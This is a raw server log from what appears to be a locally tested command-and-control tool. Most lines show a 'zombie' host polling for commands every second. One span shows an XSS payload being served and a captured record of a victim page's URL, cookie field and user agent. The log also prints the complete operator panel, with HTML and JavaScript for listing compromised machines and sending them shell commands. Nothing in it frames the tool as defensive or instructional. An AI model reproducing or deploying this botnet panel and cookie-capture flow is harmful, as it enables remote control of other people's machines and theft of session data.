2025-06-25 11:24:39 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:24:39] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:24:40 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:24:40 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:24:40 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:24:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:24:40] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:24:41 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:24:41 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:24:41 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:24:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:24:41] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:24:42 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:24:42 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:24:42 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:24:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:24:42] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:24:43 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:24:43 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:24:43 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:24:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:24:43] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:24:44 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:24:44 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:24:44 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:24:44 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:24:44] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:24:45 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:24:45 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:24:45 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:24:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:24:45] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:24:46 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:24:46 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:24:46 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:24:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:24:46] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:24:47 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:24:47 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:24:47 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:24:47 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:24:47] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:24:48 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:24:48 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:24:48 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:24:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:24:48] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:24:49 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:24:49 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:24:49 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:24:49 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:24:49] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:24:50 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:24:50 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:24:50 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0017s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:24:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:24:50] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:24:51 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:24:51 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:24:51 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:24:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:24:51] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:24:52 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:24:52 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:24:52 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0017s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:24:52 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:24:52] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:24:53 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:24:53 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:24:53 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:24:53 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:24:53] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:24:54 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:24:54 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:24:54 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:24:54 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:24:54] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:24:55 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:24:55 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:24:55 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:24:55 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:24:55] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:24:56 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:24:56 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:24:56 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:24:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:24:56] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:24:57 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:24:57 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:24:57 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:24:57 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:24:57] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:24:58 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:24:58 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:24:58 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:24:58 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:24:58] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:24:59 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:24:59 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:24:59 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:24:59 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:24:59] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:25:00 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:25:00 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:25:00 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:25:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:00] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:25:01 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:25:01 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:25:01 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:25:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:01] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:25:02 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:25:02 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:25:02 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:25:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:02] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:25:03 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:25:03 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:25:03 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:25:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:03] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:25:04 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:25:04 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:25:04 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:25:04 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:04] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:25:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:25:05 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:25:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:25:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:25:06 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 xss_payload()
2025-06-25 11:25:06 | INFO     | control_route.py:125 | xss_payload() | 用戶請求XSS載荷文件
2025-06-25 11:25:06 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] xss_payload 執行完畢 (耗時: 0.0002s) -> 回傳: <Response 2102 bytes [200 OK]>
2025-06-25 11:25:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:06] "GET /api/control/xss_payload HTTP/1.1" 200 -
2025-06-25 11:25:06 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-25 11:25:06 | INFO     | control_route.py:18 | add_message() | 用戶請求添加消息 (POST)
2025-06-25 11:25:06 | INFO     | control_route.py:41 | add_message() | 消息添加成功，目標IP: 127.0.0.1,消息: {"where":"http://127.0.0.1:8000/","target_ip":"127.0.0.1","cookie":"","user_agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36","time_stamp":"2025-06-25T03:25:06.035Z"},時間: 2025-06-25 11:25:06.044123
2025-06-25 11:25:06 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0059s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-25 11:25:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:06] "[32mPOST /api/control/add_message HTTP/1.1[0m" 302 -
2025-06-25 11:25:06 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-25 11:25:06 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-25 11:25:06 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0081s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> {&#34;where&#34;:&#34;http://127.0.0.1:8000/&#34;,&#34;target_ip&#34;:&#34;127.0.0.1&#34;,&#34;cookie&#34;:&#34;&#34;,&#34;user_agent&#34;:&#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36&#34;,&#34;time_stamp&#34;:&#34;2025-06-25T03:25:06.035Z&#34;}</p>\n            <p><strong>建立時間:</strong> 2025-06-25 11:25:06.039456</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-25 11:25:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:06] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-25 11:25:06 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:25:06 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:25:06 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:25:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:06] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:25:07 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:25:07 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:25:07 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:25:07 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:07] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:25:07 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:25:07 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:25:07 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:25:07 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:07] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:25:08 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:25:08 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:25:08 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:25:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:08] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:25:09 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:25:09 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:25:09 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:25:09 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:09] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:25:10 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:25:10 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:25:10 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:25:10 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:10] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:25:11 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
